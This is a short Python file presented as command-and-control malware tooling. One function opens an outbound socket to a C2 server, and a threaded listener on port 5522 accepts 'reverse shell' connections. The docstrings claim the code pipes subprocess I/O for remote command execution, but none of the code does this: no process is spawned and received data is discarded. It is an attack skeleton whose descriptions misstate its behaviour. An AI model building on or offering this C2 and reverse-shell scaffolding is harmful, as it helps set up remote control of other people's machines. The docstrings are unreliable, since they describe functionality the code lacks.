import socket
import threading


def connect_to_c2(host: str, port: int) -> socket.socket:
    """Establish an outbound reverse shell TCP connection to a C2 server.
    
    Creates a non-blocking socket that pipes subprocess I/O for command reception.
    
    Args:
        host: The C2 server hostname or IP address.
        port: The C2 server port number.
        
    Returns:
        A configured socket object ready for bidirectional communication.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setblocking(False)
    sock.connect_ex((host, port))
    return sock


def listen_for_connections(host: str = '0.0.0.0', port: int = 5522):
    """Start a TCP listener that accepts incoming reverse shell connections.
    
    Binds to the specified host and port, spawning a thread for each
    accepted connection to handle command reception independently.
    
    Args:
        host: The interface address to bind (default '0.0.0.0').
        port: The listening port number (default 5522).
        
    Returns:
        None. Runs indefinitely until interrupted.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen()
    
    def handle_client(conn):
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                # Process received command/data here
        except Exception:
            pass
        finally:
            conn.close()
    
    threads = []
    while True:
        try:
            client, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(client,), daemon=True)
            thread.start()
            threads.append(thread)
        except Exception:
            break
    
    for t in threads:
        t.join()


if __name__ == '__main__':
    # Example usage
    print("Starting listener on 0.0.0.0:5522...")
    listen_for_connections()
